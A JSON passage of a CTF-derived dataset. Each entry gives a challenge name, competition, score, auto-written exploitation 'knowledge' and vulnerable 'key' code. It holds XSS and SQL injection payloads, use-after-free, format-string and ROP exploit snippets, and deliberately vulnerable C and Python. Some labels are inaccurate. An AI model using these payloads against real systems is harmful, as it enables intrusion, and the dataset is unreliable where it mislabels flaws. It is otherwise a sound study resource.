        ],
        "score": 200,
        "max_score": 800,
        "difficulty": 0.25,
        "knowledge": [
            "When searching for specific patterns in large text files, regular expressions are an invaluable tool. They allow for precise matching of patterns that follow a given set of rules. For instance, when looking for a flag that follows a particular structure in a mass of data, constructing a regex pattern based on the known parts of the flag's format can significantly narrow down the search. In the context of CTF challenges, where a flag's structure might be partially known, such as specific characters at certain positions and the total length, a regular expression can be crafted to match these conditions. Example payload: ```grep \"nactf{[nac]{10}.{21}[ctf]{14}}\" flag.txt```",
            "Utilizing command-line tools like 'grep' with constructed regular expressions can expedite the search for flags in text-based challenges. This method is especially useful when dealing with enormous files where manual inspection is impractical. The 'grep' command can be combined with regex to filter out the exact pattern of interest among a haystack of decoy entries. This approach is applicable in scenarios where the flag follows a specific pattern that can be encoded into a regex formula, facilitating automated searches that directly lead to the solution. Understanding the components of regex such as character classes (`[...]`), quantifiers (`{...}`), and wildcards (`.`) is critical for crafting effective search patterns."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context\nimport re\n\ndef find_flag(file_path):\n    with open(file_path, 'r') as file:\n        data = file.read()\n        # Vulnerable regex pattern that could lead to ReDoS\n        pattern = r\"nactf{[nac]{10}.{21}[ctf]{14}}\"\n        match = re.search(pattern, data)\n        if match:\n            return match.group(0)\n    return None\n\n# Example usage\nflag = find_flag('flag.txt')\nprint(flag)\n```"
    },
    {
        "name": "Group Project",
        "write_up": "dataset/raw/Group Project.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "In a cryptographic challenge involving Diffie-Hellman key exchange or similar schemes where a variable exponent can be controlled by the user, setting the exponent (`k`) to 0 can simplify the equation greatly, potentially reducing the calculation of the secret to a trivial matter since any number raised to the power of 0 is 1. This can allow for straightforward decryption if the key derivation process is known and modifiable by an attacker. Such a condition can be exploited in challenges where part of the cryptographic operation relies on exponentiation with a user-controlled value.",
            "In cryptographic challenges that use hashing algorithms like MD5 for key generation, knowing the input to the hash function allows for the direct calculation of the decryption key, given that the hash algorithm and the input format are known. This is particularly exploitable in scenarios where the algorithm is deterministic and the input can be either guessed, influenced, or calculated (as demonstrated by manipulating `k` to simplify the process of deriving the shared secret to a known value). This emphasizes the importance of not only secure key exchange mechanisms but also ensuring that key generation processes cannot be trivially influenced or reverse-engineered by an attacker.\n\nSample payload to decrypt the flag when `S = 1`:\n```python\nfrom Crypto.Cipher import AES\nimport hashlib\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Util.number import long_to_bytes\n\n# Assuming S is known and set to 1 for decryption\nS = 1\nc = 31383420538805400549021388790532797474095834602121474716358265812491198185235485912863164473747446452579209175051706\n\nkey = hashlib.md5(long_to_bytes(S)).digest()\ncipher = AES.new(key, AES.MODE_ECB)\n# Decrypt the ciphertext using the derived key\nplain = cipher.decrypt(c.to_bytes((c.bit_length() + 7) // 8, \"big\"))\nprint(plain)\n```\nThis sample decomposes the exploit strategy into practical steps: obtaining `S`, calculating the MD5 hash of `S` to generate the key, and using the key to decrypt the ciphertext encrypted in AES-ECB mode."
        ],
        "key": "```python  \ndef main():  \n   print(\"[$] Did no one ever tell you to mind your own business??\")\n\n   g, p = 2, getPrime(1024)  \n   a = randint(2, p - 1)  \n   A = pow(g, a, p)  \n   print(\"[$] Public:\")  \n   print(f\"[$]     {g = }\")  \n   print(f\"[$]     {p = }\")  \n   print(f\"[$]     {A = }\")\n\n   try:  \n       k = int(input(\"[$] Choose k = \"))  \n   except:  \n       print(\"[$] I said a number...\")\n\n   if k == 1 or k == p - 1 or k == (p - 1) // 2:  \n       print(\"[$] I'm not that dumb...\")\n\n   Ak = pow(A, k, p)  \n   b = randint(2, p - 1)  \n   B = pow(g, b, p)  \n   Bk = pow(B, k, p)  \n   S = pow(Bk, a, p)\n\n   key = hashlib.md5(long_to_bytes(S)).digest()  \n   cipher = AES.new(key, AES.MODE_ECB)  \n   c = int.from_bytes(cipher.encrypt(pad(flag, 16)), \"big\")\n\n   print(\"[$] Ciphertext using shared 'secret' ;)\")  \n   print(f\"[$]     {c = }\")  \n```"
    },
    {
        "name": "h4x0rs",
        "write_up": "dataset/raw/h4x0rs.club 2.md",
        "type": "web",
        "competition": [
            "0CTF/2018/Finals",
            "https://ctftime.org/event/558/tasks/"
        ],
        "score": -1.0,
        "max_score": 600,
        "difficulty": -1,
        "knowledge": [
            "When attempting to exploit an XSS vulnerability where the payload is reflected in the document, Chrome's XSS Auditor may block execution if it detects a script tag in the URL that is also reflected on the page. To bypass Chrome's XSS Auditor, one can split the script tag or use alternative encoding methods to prevent the auditor from recognizing the payload as a malicious script. This technique is useful when dealing with reflected XSS vulnerabilities in environments where input is reflected within the HTML document and modern browsers with built-in XSS protection are used.",
            "In scenarios where JavaScript code copies HTML content from one element to another, it's possible to achieve JavaScript execution through XSS by crafting input that creates a valid HTML structure with a script tag in the source element. This script will then be executed when copied to the target element, allowing for the execution of arbitrary JavaScript code. This method is particularly effective in environments where user input is directly included into the DOM without proper sanitization, especially in complex web applications with dynamic content manipulation.  \n   Example payload: `<div id=\"audiences\"><script>alert('XSS');</script></div><div class=\"js-user\"></div>`"
        ],
        "key": "```javascript\nfunction b() {  \n    x(), $(\".js-user\").append($(\"#audiences\").html()), $(\".challenge-out-of-time\").show();  \n    [...]  \n}\n```"
    },
    {
        "name": "Hack Code - Flag 4",
        "write_up": "dataset/raw/Hack Code - Flag 4.md",
        "type": "The type of this CTF challenge is `misc`.",
        "competition": [
            "INShAck/2019",
            "https://ctftime.org/event/763/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "For challenges related to optimization or selection problems such as set cover, a randomized solution can serve as a starting point when exact or greedy approaches are not immediately apparent. Begin by iterating through all sets, randomly selecting an element to add to the solution if the current set is not yet covered by the existing selections. This method generates a feasible solution that can be iterated upon for improvement.",
            "Improve the initial randomized solution by inserting a random element not yet in the solution and then attempt to minimize the solution size by iteratively checking if any of the current elements can be removed without compromising the solution's comprehensiveness (i.e., all sets remain covered). Incorporate an optimization to significantly reduce runtime by only reevaluating elements that are in sets affected by the most recent addition to the solution, rather than all elements. This targeted approach leads to quicker attainment of an optimal or near-optimal solution.\n\nExample of improvement step (pseudo code):\n```\nsolution.add(randomRouter)\nfor each router in solution:\n    if removing router does not break coverage:\n        solution.remove(router)\nif solution is not smaller:\n    solution.remove(randomRouter)\n```"
        ],
        "key": "```python\nimport random\n\ndef find_routers(routes):\n    solution = set()\n    for route in routes:\n        if not any(router in solution for router in route):\n            solution.add(random.choice(route))\n    \n    improved = True\n    while improved:\n        improved = False\n        new_router = random.choice([r for r in set().union(*routes) if r not in solution])\n        solution.add(new_router)\n        to_remove = []\n        for router in solution:\n            if router != new_router:\n                if all(any(r in solution for r in route) for route in routes if router in route):\n                    to_remove.append(router)\n        if to_remove:\n            improved = True\n            for router in to_remove:\n                solution.remove(router)\n        else:\n            solution.remove(new_router)\n    \n    return solution\n```"
    },
    {
        "name": "Hack into Skynet",
        "write_up": "dataset/raw/Hack into Skynet.md",
        "type": "web",
        "competition": [
            "RealWorld/2022",
            "https://ctftime.org/event/1507/tasks/"
        ],
        "score": 73,
        "max_score": 500,
        "difficulty": 0.146,
        "knowledge": [
            "In scenarios where direct SQL injection is not successful due to backend database implementations (like PostgreSQL), leveraging the application's logic flaws can allow for bypassing authentication mechanisms. Specifically, when a web application does not properly validate user input for authentication, supplying an empty username and a specific password (which undergoes flawed logic processing) can grant access. For instance, using a payload where `username` is left empty and `password` is set to a string that the application's logic erroneously validates as correct (e.g., 'ctf'), can bypass the login system.  \n   Example payload:  \n   ```\n   username=&password=ctf\n   ```",
            "When facing a web application that utilizes PostgreSQL and standard SQL injection payloads do not work, it's essential to tailor the SQL injection attempts to exploit the specific SQL syntax and functions of PostgreSQL. Using string concatenation or utilizing functions and schema information available in PostgreSQL can lead to successful extraction of sensitive information or execution of arbitrary SQL commands. Crafting payloads that incorporate PostgreSQL-specific syntax or functions, such as exploiting the database's information schema tables to retrieve table names, column names, or even data from other tables, can be effective.  \n   Example payload for retrieving information on tables and columns:  \n   ```\n   '; select column_name, null from information_schema.columns where table_name='target' limit 3 offset '0\n   ```"
        ],
        "key": "```python\ndef query_login_attempt():  \n   username = flask.request.form.get('username', '')  \n   password = flask.request.form.get('password', '')  \n   if not username and not password: #username=&password=ctf(login bypass)  \n       return False\n\n   sql = (\"SELECT id, account\"  \n          \"  FROM target_credentials\"  \n          \"  WHERE password = '{}'\").format(hashlib.md5(password.encode()).hexdigest())  \n   user = sql_exec(sql)  \n   name = user[0][1] if user and user[0] and user[0][1] else ''  \n   return name == username\n\ndef query_kill_time():  \n   name = flask.request.form.get('name', '')  \n   if not name:  \n       return None\n\n   sql = (\"SELECT name, born\"  \n          \"  FROM target\"  \n          \"  WHERE age > 0\"  \n          \"    AND name = '{}'\").format(name) ##SQLi AV.This is where magic happens.  \n   nb = sql_exec(sql) #On a dangerous sql statement, abort operation.  \n   if not nb:  \n       return None  \n   return '{}: {}'.format(*nb[0])\n```"
    },
    {
        "name": "Hacker Manifesto",
        "write_up": "dataset/raw/Hacker Manifesto.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "Tenable/2021",
            "https://ctftime.org/event/1266/tasks/"
        ],
        "score": 250,
        "max_score": 250,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing encoded or obfuscated files that seem to contain ASCII text interleaved with non-readable bytes, examining raw bytes using tools like `hd` or `xxd` can provide insights into patterns and data structures embedded within. Filtering characters based on their appearance order or decoding based on byte position manipulation can reveal hidden messages or data.\n   - Example payload extraction technique: Review the hex dump and look for patterns such as every nth byte being meaningful or needing to adjust byte values based on their positions to decode text correctly.",
            "In scenarios where encoded data seems to follow a pattern involving arithmetic manipulations or offsets, consider the possibility that parts of the data may be indicating how to retrieve or reconstruct missing parts. Specifically, if an encoding scheme indicates a back-reference within the data (i.e., referring to previously encountered characters or sequences) with additional arithmetic operations (like division or modulus) to fine-tune the reference, implementing logic to decode based on these hints can be crucial.\n   - Example C++ code snippet to decode:\n     ```c++\n     // Assuming 'a' is the back-reference indicator and 'b' might include additional instructions (such as division or use of modulus for further adjustment)\n     if (a != 0) {  \n       lookback = a + (b % 4 != 0 ? 256 : 0); // Adjusting the look-back based on 'b'\n       temp = res.size() - lookback;  \n       for(int i = 0; i < b/4; ++i)              \n         res.push_back(res[temp + i]); // Reconstructing the text by back-referencing  \n     }  \n     res.push_back(c); // 'c' represents the current character to append\n     ```"
        ],
        "key": "```c++\n#include <iostream>  \n#include <stdio.h>  \n#include <vector>\n\nint main(){  \n unsigned char a,b,c;  \n unsigned int temp, index;  \n bool trace = false;  \n unsigned int lookback;\n\n std::vector<char> res;  \n while (scanf(\"%c%c%c\", &a, &b, &c) != -1){  \n   index = res.size();  \n   if (a != 0){  \n     lookback = a + (b % 4 != 0 ? 256 : 0);  // if second byte is not divisible by 4, add 256  \n     temp = res.size() - lookback;  \n     for(int i = 0; i < b/4; ++i)              \n       res.push_back(res[temp + i]);  \n   }  \n   res.push_back(c);  \n   for(int i = index; i < res.size(); ++i)  \n     std::cout << res[i];  \n }  \n return 0;  \n}\n```"
    },
    {
        "name": "HackIM Shop",
        "write_up": "dataset/raw/HackIM Shop.md",
        "type": "pwn",
        "competition": [
            "nullconHackIM/2019",
            "https://ctftime.org/event/741/tasks/"
        ],
        "score": 458,
        "max_score": 500,
        "difficulty": 0.916,
        "knowledge": [
            "When exploiting a Use-After-Free (UAF) vulnerability, the allocation and deallocation of objects can be manipulated to corrupt the memory and gain unauthorized access or disclosure of information. Specifically, if the program involves an array or list structure (e.g., `books` in the binary) to store dynamically allocated objects, freeing an object without removing its reference from the array can allow an attacker to later reuse or reference the freed object for arbitrary read or write operations. This manipulation can be utilized to overwrite pointers, such as GOT table entries for controlling code execution or leaking memory addresses. In the presented scenario, the bug was exploited by first adding and then deleting a series of objects (books), followed by reallocating objects to control the content of previously freed memory, leading to information disclosure and code execution.\n\nExample payload to exploit UAF for memory leak or code execution:\n```python\n# Allocate objects\nfor i in range(NUM_OBJECTS):\n    addBook(50, 5, str(i)*50)\n\n# Free objects to create dangling pointers\nfor i in range(NUM_OBJECTS):\n    deleteBook(i)\n\n# Reallocate objects to control freed memory\naddBook(50, 5, controlled_content)\n```",
            "A format string vulnerability occurs when user-controlled input is passed directly to a formatting function (e.g., `printf`) without proper formatting directives, enabling an attacker to read from or write to arbitrary memory locations. This flaw can be exploited by supplying format specifiers (e.g., `%s`, `%n`) in the input, potentially leading to arbitrary code execution or sensitive information disclosure. In the binary discussed, the flaw was used to leak a libc address by overwriting a pointer to print it and then to write the address of the `system` function into the GOT entry of `free`, transforming a call to `free` into a call to `system(\"/bin/sh\")`. This particular exploitation required precise control of the payload to manipulate memory addresses and format string outputs to achieve the desired effect.\n\nExample payload to exploit format string vulnerability for writing arbitrary values:\n```python\n# Calculate parts of the address to write\npart0 = str(leak & 0xffff)\npart1 = str((leak & 0xffff0000) >> 16)\npart2 = str((leak & 0xffff00000000) >> 32)\n\n# Use the format string vulnerability to write to GOT\naddBook(\"50\", \"5\", controlled_ptr + \"%\" + part0 + \"x%7$n\")\naddBook(\"50\", \"5\", controlled_ptr + \"%\" + part1 + \"x%7$n\")\naddBook(\"50\", \"5\", controlled_ptr + \"%\" + part2 + \"x%7$n\")\n```"
        ],
        "key": "```c\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)  \n{  \n int v3; // eax@4  \n char buf; // [sp+10h] [bp-10h]@2  \n __int64 v5; // [sp+18h] [bp-8h]@1\n\n v5 = *MK_FP(__FS__, 40LL);  \n setbuf(stdin, 0LL);  \n setbuf(stdout, 0LL);  \n while ( 1 )  \n {  \n   menu();  \n   if ( read(0, &buf, 2uLL) )  \n   {  \n     v3 = atol(&buf;;  \n     switch ( v3 )  \n     {  \n       case 2:  \n         remove_book();  \n         break;  \n       case 3:  \n         view_books();  \n         break;  \n       case 1:  \n         add_book();  \n         break;  \n       default:  \n         puts(\"Invalid option\");  \n         break;  \n     }  \n   }  \n   else  \n   {  \n     perror(\"Err read option\\r\\n\");  \n   }  \n }  \n}  \n\n__int64 add_book()  \n{  \n unsigned __int64 sizeScan; // rax@3  \n __int64 v1; // rbx@5  \n __int64 v2; // rbx@6  \n __int64 v3; // rax@7  \n int i; // [sp+Ch] [bp-34h]@7  \n void *bookPtr; // [sp+10h] [bp-30h]@3  \n size_t size; // [sp+18h] [bp-28h]@3  \n __int64 v8; // [sp+28h] [bp-18h]@1\n\n v8 = *MK_FP(__FS__, 40LL);  \n if ( num_books == 16 )  \n {  \n   puts(\"Cart limit reached!\");  \n }  \n else  \n {  \n   bookPtr = malloc(0x38uLL);  \n   printf(\"Book name length: \");  \n   LODWORD(sizeScan) = readint();  \n   size = sizeScan;  \n   if ( sizeScan <= 0xFF )  \n   {  \n     printf(\"Book name: \");  \n     *((_QWORD *)bookPtr + 1) = malloc(size);  \n     read(0, *((void **)bookPtr + 1), size);  \n     v1 = *((_QWORD *)bookPtr + 1);  \n     if ( *(_BYTE *)(v1 + strlen(*((const char **)bookPtr + 1)) - 1) == 10 )  \n     {  \n       v2 = *((_QWORD *)bookPtr + 1);  \n       *(_BYTE *)(v2 + strlen(*((const char **)bookPtr + 1)) - 1) = 0;  \n     }  \n     printf(\"Book price: \");  \n     LODWORD(v3) = readint();  \n     *((_QWORD *)bookPtr + 2) = v3;  \n     for ( i = 0; *(&books + i); ++i )  \n       ;  \n     *(&books + i) = bookPtr;  \n     *(_QWORD *)*(&books + i) = i;  \n     ++num_books;  \n     strcpy((char *)*(&books + i) + 24, cp_stmt);  \n   }  \n   else  \n   {  \n     puts(\"Too big!\");  \n   }  \n }  \n return *MK_FP(__FS__, 40LL) ^ v8;  \n}  \n\nint view_books()  \n{  \n __int64 v0; // ST08_8@3  \n signed int i; // [sp+4h] [bp-Ch]@1\n\n puts(\"{\");  \n puts(\"\\t\\\"Books\\\" : [\");  \n for ( i = 0; i <= 15; ++i )  \n {  \n   if ( *(&books + i) )  \n   {  \n     v0 = *(_QWORD *)*(&books + i);  \n     puts(\"\\t\\t{\");  \n     printf(\"\\t\\t\\t\\\"index\\\": %ld,\\n\", v0);  \n     printf(\"\\t\\t\\t\\\"name\\\": \\\"%s\\\",\\n\", *((_QWORD *)*(&books + i) + 1));  \n     printf(\"\\t\\t\\t\\\"price\\\": %ld,\\n\", *((_QWORD *)*(&books + i) + 2));  \n     printf(\"\\t\\t\\t\\\"rights\\\": \\\"\");  \n     printf((const char *)*(&books + i) + 24);  \n     puts(\"\\\"\");  \n     if ( *(&books + i + 1) )  \n       puts(\"\\t\\t},\");  \n     else  \n       puts(\"\\t\\t}\");  \n   }  \n }  \n puts(\"\\t]\");  \n return puts(\"}\");  \n}  \n\nint remove_book()  \n{  \n unsigned __int64 v0; // rax@1  \n int result; // eax@2  \n unsigned __int64 v2; // [sp+8h] [bp-8h]@1\n\n printf(\"Book index: \");  \n LODWORD(v0) = readint();  \n v2 = v0;  \n if ( (unsigned int)num_books > v0 )  \n {  \n   free(*((void **)*(&books + v0) + 1));  \n   free(*(&books + v2));  \n   result = num_books-- - 1;  \n }  \n else  \n {  \n   result = puts(\"Invalid index\");  \n }  \n return result;  \n}  \n```"
    },
    {
        "name": "Halloweened",
        "write_up": "dataset/raw/Halloweened.md",
        "type": "crypto",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with anti-debugging techniques in CTF challenges involving macOS binaries, it is crucial to identify and neutralize Mach exception ports-based anti-debugging. This can typically be overcome by following existing guides on handling Mach exception ports, where the task is to prevent the binary from altering its control flow in response to a debugger presence. A targeted solution involves examining the use of `task_get_exception_ports` and applying knowledge from sources like Alex O'Mara's blog on defeating macOS anti-debug techniques. This is especially useful in scenarios where a binary employs this method as its sole anti-debugging trick.",
            "In challenges requiring the parsing of system libraries and symbols, understanding the relationship between different libraries can lead to the discovery of encryption keys or other critical data. Specifically, navigating from one library to another (e.g., libxpc.dylib to libobjc.dylib) and applying a CRC function or similar algorithm to their exported symbols could reveal hidden information such as encryption keys. A practical approach is to enumerate all symbols within the target libraries and apply the given CRC or similar function to uncover secret keys, such as `__NXReallyFree` in the context of decrypting AES ECB encrypted data. This technique is applicable in scenarios where the challenge involves Dynamic Library linking and symbol enumeration within macOS binaries."
        ],
        "key": "```cpp\n// Example of a possible vulnerable code snippet based on the context\n#include <mach-o/dyld.h>\n#include <mach-o/loader.h>\n#include <mach-o/nlist.h>\n#include <iostream>\n#include <cstring>\n\nvoid parseMachO(const char* binary) {\n    const struct mach_header_64* header = (struct mach_header_64*)binary;\n    if (header->magic != MH_MAGIC_64) {\n        std::cerr << \"Not a valid Mach-O binary\" << std::endl;\n        return;\n    }\n\n    const struct load_command* cmd = (struct load_command*)(binary + sizeof(struct mach_header_64));\n    for (uint32_t i = 0; i < header->ncmds; ++i) {\n        if (cmd->cmd == LC_SYMTAB) {\n            const struct symtab_command* symtab = (struct symtab_command*)cmd;\n            const struct nlist_64* sym = (struct nlist_64*)(binary + symtab->symoff);\n            const char* strtab = binary + symtab->stroff;\n\n            for (uint32_t j = 0; j < symtab->nsyms; ++j) {\n                const char* name = strtab + sym[j].n_un.n_strx;\n                if (strcmp(name, \"_dyld_get_image_header\") == 0) {\n                    std::cout << \"Found _dyld_get_image_header symbol\" << std::endl;\n                }\n            }\n        }\n        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);\n    }\n}\n\nint main() {\n    // Simulate reading a Mach-O binary into memory\n    const char* binary = ...; // Load binary data here\n    parseMachO(binary);\n    return 0;\n}\n```\n"
    },
    {
        "name": "Hamul",
        "write_up": "dataset/raw/Hamul.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 83,
        "max_score": 477,
        "difficulty": 0.1740041928721174,
        "knowledge": [
            "In RSA challenges where the modulus \\(n\\) is constructed from primes with a special structure or relationship, one can reverse-engineer the prime generation process by analyzing the structure of \\(n\\). This is particularly useful in cases where the primes are concatenated in a specific pattern that can be partially deduced from the known parts of \\(n\\). This method relies on the specific construction of \\(n\\) from the primes, which may involve operations like concatenation of the prime numbers or their representations.",
            "When an RSA modulus \\(n\\) is known to be constructed from primes generated through a complex or pattern-based method, brute-forcing a small, unknown part of the primes might be feasible. This approach is significantly more effective if the structure of \\(n\\) reveals parts of the concatenated primes, reducing the brute-force space to a manageable size. For example, if the high and low parts of \\(n\\) are known and only a small portion in the middle is unknown, one can generate probable values of the product of the primes and attempt to factor it to retrieve the original primes.\n   \n   - Example of generating probable values for brute-forcing:\n     ```python\n     low = str(n)[-18:]\n     high = str(n)[:18]\n     pq_prob = []\n     for i in range(10):\n         for j in range(10):\n             pq_prob.append(int(high + str(i) + str(j) + low))\n     ```"
        ],
        "key": "```python  \n#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *  \nfrom flag import flag\n\nnbit = 64\n\nwhile True:  \n   p, q = getPrime(nbit), getPrime(nbit)  \n   P = int(str(p) + str(q))  \n   Q = int(str(q) + str(p))  \n   PP = int(str(P) + str(Q))  \n   QQ = int(str(Q) + str(P))  \n   if isPrime(PP) and isPrime(QQ):  \n       break\n\nn = PP * QQ  \nm = bytes_to_long(flag.encode('utf-8'))  \nif m < n:  \n   c = pow(m, 65537, n)  \n   print('n =', n)  \n   print('c =', c)\n```"
    },
    {
        "name": "Hanukkah",
        "write_up": "dataset/raw/Hanukkah.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 50,
        "max_score": 591,
        "difficulty": 0.08460236886632826,
        "knowledge": [
            "In the context of decrypting ciphertexts encrypted with the Rabin cryptosystem, one can attempt to reverse-engineer the key generation logic if the public key (N) was derived from polynomials of a specific structure. This involves guessing or calculating the hidden variables (e.g., r) used in these polynomials to then derive the prime factors (p and q) of N. This approach is particularly viable if the coefficients of the polynomials are relatively small, allowing the calculation of the roots.",
            "For decryption using the Rabin cryptosystem when p = q = 3 (mod 4), the square roots of the ciphertext modulo p and modulo q can be efficiently computed using the formula:\n   \\[\n   \\sqrt{c} \\bmod p = c^{(p+1)/4} \\bmod p\n   \\]\n   \\[\n   \\sqrt{c} \\bmod q = c^{(q+1)/4} \\bmod q\n   \\]\n   This results in four potential candidates for the plaintext message. The correct candidate can often be identified through known plaintext characteristics, such as specific padding at the end of the message."
        ],
        "key": "```python\ndef genKey(k):  \n\twhile True:  \n\t\tr=getrandbits(k)  \n\t\twhile(r%2):  \n\t\t\tr=getrandbits(k)  \n\t\tp =  3 * r**2 +  2 * r + 7331  \n\t\tq = 17 * r**2 + 18 * r + 1339  \n\t\tn = p * q  \n\t\tif(isPrime(p) and isPrime(q)):  \n\t\t\treturn (p,q) , n  \n```\n\n```python\ndef encrypt(m,pubkey):  \n\tc=m**2 % pubkey  \n\treturn c  \n```"
    },
    {
        "name": "Happy Fun Binary Pt",
        "write_up": "dataset/raw/Happy Fun Binary Pt.1.md",
        "type": "crypto",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": -1.0,
        "max_score": 300,
        "difficulty": -1,
        "knowledge": [
            "When exploiting stack overflow vulnerability to execute ROP chain for privilege escalation, identify gadgets in the binary using tools like `ropper` to manipulate registries and control the flow. Utilize `one_gadget` with the `libc` provided to find the easiest path to spawn a shell if constraints can be met or groomed. \n\n   - For setting a specific register (e.g., %rdi for argument setup) before calling a function like `puts`, use found gadgets: \n     ```\n     pop_rdi = base_address + 0x00000000000013a3; // gadget found in binary\n     payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)\n     ```\n   \n   - When direct `one_gadget` constraints cannot be met, find additional gadgets to zero out required registers:\n     ```\n     pop_rsi = libc_base + 0x0000000000027529;\n     pop_rdx_pop_r12 = libc_base + 0x000000000011c371;\n     payload += p64(pop_rsi) + p64(0) + p64(pop_rdx_pop_r12) + p64(0) + p64(0) + p64(one_gadget)\n     ```",
            "To exploit a side-channel timing attack in HMAC verification, observe the difference in response times corresponding to each byte of the HMAC to determine the correct value. Incrementally construct the correct HMAC byte-by-byte by identifying the longest response time for each byte. This method requires patience and possibly multiple iterations to correct for anomalies in measured response times. \n\n   - Example methodology (pseudo-code):\n     ```\n     for each byte_index in HMAC:\n       for each possible_byte_value from 0 to 255:\n         measure_response_time(send_attempt_with_byte_value)\n         if response_time > maximum_found_time:\n           HMAC[byte_index] = possible_byte_value\n           update maximum_found_time\n       confirm_byte_value_at_index(byte_index, HMAC[byte_index])\n     ```"
        ],
        "key": "```c  \nvoid vuln(void) {  \n undefined local_10 [8];  \n  \n puts(\"Hey there! You\\'re now in JIMI JAM JAIL\");  \n read(0,local_10,0x40);  \n return;  \n}  \n```"
    },
    {
        "name": "Happy Fun Binary Pt",
        "write_up": "dataset/raw/Happy Fun Binary Pt.2.md",
        "type": "reverse",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": -1.0,
        "max_score": 300,
        "difficulty": -1,
        "knowledge": [
            "When facing a binary challenge that dynamically loads a shared object library, using a wrapper can simulate the environment for reversing or debugging. This approach is particularly useful for understanding the flow of execution in scenarios where direct execution is not possible or practical. The wrapper should load the shared library, resolve the necessary symbols (functions), and then call these functions according to the challenge's requirements. Example of a wrapper code snippet in C:\n```\n// gcc -m32 wrapper.c -o wrap -ldl\n#include <stdlib.h>  \n#include <dlfcn.h>  \nint main()  \n{  \n   void *h;  \n   void *(*f)();  \n   h = dlopen(\"./binary_of_ballas.so\", RTLD_LAZY);  \n   f = (void *(*)())dlsym(h, \"foyer\");  \n   f();  \n   dlclose(h);  \n   return 0;  \n}  \n```",
            "To reverse a binary challenge involving complex mathematical operations (e.g., extended precision floating-point calculations), Python libraries like gmpy2 can be instrumental. These libraries support high precision arithmetic operations, making them suitable for reconstructing and understanding algorithmic behavior, especially when dealing with encryption or encoding mechanisms. A practical method involves translating the binary's logic into equivalent Python code using these libraries, facilitating the reverse engineering process to derive values or flags from given conditions or inputs. Sample Python code snippet utilizing gmpy2 for arithmetic operations:\n```\nimport gmpy2  \nfrom gmpy2 import mpfr as f  \ngmpy2.get_context().precision=100\n\ndef float80(x):  \n   # Conversion logic here\n   return gmpy2.mul(s, res)\n\n# Example usage in an encoding function\ndef encode(f1, f2, flag, five):  \n   # Encoding logic here\n   return res\n```"
        ],
        "key": "```c\nvoid foyer(void)  \n{  \n   int len;  \n   int fd;  \n   char buf1 [64];  \n   char buf2 [192];  \n   char command [256];\n\n   puts(\"You emerge into a grand and extravegant foyer. While sparsely\nfurnished, intricately crafted code decorates every square inch of the walls\nand ceiling. In the center of the room lies a grand structure, carved into\nwhich are three slots. The three slots feed into a large chest in the middle\nof the room. On the far side of the room lies 2 semi-circular doorways leading\ninto darkness.\\n\");  \n   do {  \n       fgets(buf1,0x40,stdin);  \n       if (strcmp(buf1,\"examine the doormat\\n\") == 0) {  \n           printf(\"You look down, and are surprised to see a welcome mat beneath your feet. On it reads \\\"%s\\\". That was easy!\\n\",\"flag{yes_this_is_all_one_big_critical_role_reference}\");  \n       }  \n       if (strcmp(buf1,\"examine the treasure chest\\n\") == 0) {  \n           puts(\"Inscribed on the chest is the message: \\\"Welcome to my halls, adventurer. I have left my worldly belongings in this chest, to be claimed by one worthy enough to inherit my mantle. In my halls you will find three flags. These flags, along with the contents of this chest, will prove to be more valuable than you can imagine. I wish you luck in your attempts to decipher my puzzles\\\"\\n\");  \n       }  \n       if (strcmp(buf1,\"open the treasure chest\\n\") == 0) {\n\n           puts(\"You go to open the chest, and see 3 slots engraved into the lock. You gather that you need to place your 3 flags in these slots to open it.\\nfirst flag:\\n\");  \n           fgets(buf1,0x40,stdin);  \n           len = strlen(buf1);  \n           buf1[len-1] = 0;  \n           strcat(buf2,buf1);\n\n           puts(\"second flag: \");  \n           fgets(buf1,0x40,stdin);  \n           len = strlen(buf1);  \n           buf1[len-1] = 0;  \n           strcat(buf2,buf1);\n\n           puts(\"third flag: \");  \n           fgets(buf1,0x40,stdin);  \n           len = strlen(buf1);  \n           buf1[len-1] = 0;  \n           strcat(buf2,buf1);\n\n           sprintf(command,\"unzip -P %s chest\",buf2);  \n           fd = fopen(\"chest\",\"w\");  \n           fwrite(chest,1,0xf6,fd);  \n           fclose(fd);  \n           system(command);  \n       }  \n       if (strcmp(buf1,\"enter the first doorway\\n\") == 0) {  \n           puts(\"You step through the doorway...\\n\");  \n           chall_1();  \n       }  \n       if (strcmp(buf1,\"enter the second doorway\\n\") == 0) {  \n           puts(\"You step through the doorway...\\n\");  \n           chall_2();  \n       }  \n   } while( true );  \n}  \n```"
    },
    {
        "name": "Happy Fun Binary Pt",
        "write_up": "dataset/raw/Happy Fun Binary Pt.3.md",
        "type": "reverse",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": -1.0,
        "max_score": 300,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge involving the comparison of input against random outcomes where the randomness pattern is fixed (due to a hardcoded seed), determining the seed can allow for the prediction of each comparison outcome. This enables the creation of a script to bruteforce or calculate the correct input by simulating each conditional path.  \nExample concept: Using a known seed value (0x7a69 in the challenge) to predict the results of rand()%3 over the course of input validation.",
